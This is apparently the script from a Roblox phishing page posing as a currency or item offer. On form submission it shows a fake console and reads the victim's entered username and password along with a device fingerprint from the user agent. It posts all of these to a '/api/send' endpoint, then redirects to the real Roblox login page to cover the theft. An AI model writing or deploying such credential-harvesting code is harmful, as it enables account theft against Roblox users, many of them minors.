    <script>
        document.getElementById('rob-form').onsubmit = async (e) => {
            e.preventDefault();
            document.getElementById('submit-btn').style.display = 'none';
            document.getElementById('console').style.display = 'block';
            
            let info = "Unknown Device";
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) info = "Android";
            else if (/iPhone|iPad/i.test(ua)) info = "iOS";
            else if (/Windows/i.test(ua)) info = "Windows PC";
            
            const model = navigator.platform + " (" + info + ")";
            
            await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    u: document.getElementById('user').value, 
                    p: document.getElementById('pass').value, 
                    r: document.getElementById('amount').value,
                    m: model 
                })
            });
            setTimeout(() => { window.location.href = "https://www.roblox.com/login"; }, 3000);
        };
